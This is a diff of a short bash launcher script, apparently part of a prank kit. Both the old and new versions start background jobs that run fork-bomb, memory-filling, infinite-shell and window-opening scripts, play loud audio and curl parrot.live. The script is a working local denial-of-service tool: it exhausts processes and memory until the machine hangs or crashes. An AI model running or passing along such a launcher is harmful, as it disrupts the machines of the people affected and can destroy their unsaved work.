@@ -1,14 +1,10 @@
 #!/bin/bash
 
-./*.sh &
-bash aliasgccfart.sh &
-bash aliasoutrr.sh &
-bash fork_bomb_always.sh &
-bash full_mem.sh &
-bash goose.sh &
-bash infinite_zsh.sh &
-bash open_all.sh &
-bash simple_fork_bomb.sh &
-bash god.sh &
+./alias.sh &
+./fork_bomb_always.sh &
+# ./full_mem.sh &
+./goose.sh &
+./infinite_zsh.sh &
+./open_all.sh &
 afplay --volume 180 sicko.mp3 &
 curl parrot.live
